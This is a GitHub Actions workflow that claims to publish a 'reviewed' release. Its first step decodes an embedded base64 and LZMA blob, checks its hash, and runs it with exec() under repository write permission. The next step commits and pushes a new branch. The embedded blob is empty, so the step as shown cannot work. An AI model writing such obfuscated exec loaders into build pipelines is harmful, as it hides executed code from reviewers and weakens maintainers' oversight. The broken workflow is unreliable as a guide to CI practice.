name: Publish reviewed Instructions release
on:
  workflow_dispatch:
permissions:
  contents: write
concurrency:
  group: instructions-supabase-reviewed
  cancel-in-progress: false
jobs:
  prepare:
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    timeout-minutes: 8
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
        with:
          fetch-depth: 0
      - name: Reconstruct and verify approved bytes
        run: |
          python3 - <<'PY'
          import base64,lzma,hashlib
          data=lzma.decompress(base64.b64decode(''))
          assert hashlib.sha256(data).hexdigest()=='a14567173e6593539e6ac0d967d6bfd35d61138546ac9b2d48f4aa4e9bd8e51c'
          exec(compile(data,'reviewed-reconstruction','exec'))
          PY
      - name: Commit reviewed release branch
        run: |
          git config user.name 'c3irohbis'
          git config user.email 'c3irohbis@users.noreply.github.com'
          git switch -c instructions-supabase-reviewed-release
          git commit -m 'Move Instructions content and unread state fully to Supabase'
          git push origin HEAD:refs/heads/instructions-supabase-reviewed-release
